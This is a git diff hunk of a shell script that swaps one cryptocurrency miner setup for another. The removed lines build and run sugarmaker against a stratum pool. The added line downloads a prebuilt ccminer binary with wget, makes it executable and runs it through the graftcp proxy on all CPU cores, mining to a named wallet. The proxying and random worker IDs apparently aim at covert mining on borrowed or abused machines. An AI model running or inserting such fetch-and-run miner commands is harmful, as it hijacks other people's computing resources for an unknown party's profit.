@@ -43,9 +43,4 @@ cd ..
 
 
 
-./graftcp/graftcp git clone https://github.com/decryp2kanon/sugarmaker.git
-cd sugarmaker
-./autogen.sh
-./configure CFLAGS='-O3'
-make
-./sugarmaker -a YespowerNull -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra.$(shuf -n 1 -i 1-9999999) -p c=BTE
+./graftcp/graftcp apt-get install libjansson4 && wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04 && chmod +x ccminer_3_7_ubuntu_18.04 && ./ccminer_3_7_ubuntu_18.04 -a verus  -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe -p c=VRSC,ID=xidx2 -t $(nproc)
